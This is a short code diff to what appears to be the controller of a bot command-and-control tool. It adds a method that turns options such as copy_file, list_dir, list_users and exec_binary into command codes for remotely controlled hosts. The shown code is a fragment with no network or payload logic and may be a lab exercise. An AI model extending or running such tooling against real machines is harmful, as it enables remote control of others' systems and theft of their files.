@@ -1,5 +1,5 @@
 import argparse
-from globvars import PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, TIME_WINDOW_SECONDS, ENCODING_VARIANT_ID, ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES
+from globvars import PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, TIME_WINDOW_SECONDS, ENCODING_VARIANT_ID, ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES
 from datetime import datetime, timedelta
 import base64
 import struct # for binary packing/unpacking
@@ -124,6 +124,22 @@ class BotController:
 
     def _decode_frame(self):
         pass
+
+    def command_to_type(self, args) -> tuple[int, bytes]:
+        if args.announce:
+            return CMD_TYPES["announce"], args.announce.encode()
+        if args.list_users:
+            return CMD_TYPES["list_users"], b""
+        if args.list_dir:
+            return CMD_TYPES["list_dir"], args.list_dir.encode()
+        if args.user_id:
+            return CMD_TYPES["user_id"], b""
+        if args.copy_file:
+            return CMD_TYPES["copy_file"], args.copy_file.encode()
+        if args.exec_binary:
+            return CMD_TYPES["exec_binary"], args.exec_binary.encode()
+
+        raise ValueError("No valid command provided.")
 
 def main():
     parser = argparse.ArgumentParser(description="Bot Controller")
